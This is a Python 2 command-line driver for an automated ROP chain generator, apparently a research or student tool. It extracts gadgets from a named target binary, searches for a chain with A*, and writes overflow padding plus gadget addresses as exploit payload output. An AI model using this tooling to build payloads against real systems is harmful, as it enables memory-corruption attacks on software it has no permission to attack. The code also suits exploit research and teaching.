import sys
sys.path.insert(0, './red86')

from Extracter import *
from AStar import *

"""
Represents the configuration of the program under which it will run
"""
class Config:
    def __init__(self):
        self.input = None # Name of file containing input code
        self.output = None # Name of file in which to print output ROP shellcode
        self.binary = None # Name of binary file to attack
        self.padding = 0 # Padding between buffer start and return address on stack
        self.avoid = [] # List of bytes to avoid

    def __repr__(self):
        s = "Configuration :\n"
        if self.input:
            s += "    Input instructions : " + self.input + "\n"
        if self.output:
            s += "    Output file : " + self.output + "\n"
        s += "    Binary : " + self.binary + "\n"
        s += "    Padding in bytes : " + str(self.padding) + "\n"
        s += "    Bytes to avoid : ["
        for i, b in enumerate(self.avoid):
            if i > 0:
                s += ", "
            s += hex(b)
        s += "]\n"
        return s



def main(args):
    # Parsing command line arguments
    conf = Config()
    for a in args:
        if "-i=" in a or "--input=" in a:
            conf.input = a.split("=")[1]
        elif "-o=" in a or "--output=" in a:
            conf.output = a.split("=")[1]
        elif "-b=" in a or "--binary=" in a:
            conf.binary = a.split("=")[1]
        elif "-p=" in a or "--padding=" in a :
            conf.padding = int(a.split("=")[1].strip())
        elif "-a=" in a or "--avoid=" in a:
            conf.avoid = get_avoid_from(a.split("=")[1])
        else:
            raise ValueError("Unknown option : " + a)

    if not conf.binary:
        raise ValueError("Name of the binary file to attack required.")


    # Extracting gadgets from binary
    print("Finding gadgets in binary " + conf.binary + "...")
    extracted = extract_binary(conf.binary)


    # "What now" phase. User can update configuration or move on to generation
    sys.stdout.write("Gadgets found successfully. ")
    while True:
        print("What now ?")
        print("\tc - See current configuration")
        print("\tg - See Found Gadgets")
        print("\ti - Change filename of input instructions")
        print("\to - Change filename of output file")
        print("\ta - Change filename of bytes to avoid")
        print("\tp - Change number of bytes of padding between buffer and return address")
        print("\tq - Exit")
        print("\ts - Start generating!")
        c = raw_input().strip()
        if c == 'g':
            print(extracted)
        elif c == 'c':
            print(conf)
        elif c == "i":
            sys.stdout.write("filename : ")
            filename = raw_input().strip()
            conf.input = filename
        elif c == "o":
            sys.stdout.write("filename : ")
            filename = raw_input().strip()
            conf.output = filename
        elif c == "a":
            sys.stdout.write("filename : ")
            filename = raw_input().strip()
            conf.avoid = filename
        elif c == "p":
            inp = raw_input().strip()
            conf.padding = int(inp)
        elif c == "s":
            if not conf.input:
                print("Input Instruction file not specified.")
                continue
            if not conf.output:
                print("Output file not specified.")
                continue
            break
        elif c == "q":
            exit(0)
        else:
            print("Enter one of the above letters and press enter to execute the associated command")

    print(conf)

    print("Generating graph from input instructions...")
    graph = Graph.from_file(conf.input)

    print("Filtering out invalid gadgets...")
    extracted.filter(conf.avoid)

    print("Starting to look for sequence of gadgets...")
    state = AStar(graph, extracted).run()

    # Extracting solution if exists
    solution = ""
    if state:
        while state:
            addr = state.get_action_addr()
            if addr:
                addr = hex(addr)[2:]
                if len(addr) % 2 != 0:
                    addr = "0" + addr
                solution += addr.decode('hex')
            state = state.get_prev_state()

        solution = solution[::-1]
        with open(conf.output, "w") as fout:
            fout.write("A"*conf.padding)
            fout.write(solution)
        print (solution.encode('hex'))
    else:
        print("No solution found :(")


"""
Parses Avoid file to extract list of bytes to avoid
"""
def get_avoid_from(filename):
    avoid = []
    with open(filename, "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            if len(line) == 0:
                continue
            if len(line) != 4:
                raise ValueError("each line of " + filename + " must contain one byte to avoid in the form '0x..'")
            avoid.append(int(line[2:], 16))
    return avoid


main(sys.argv[1:])
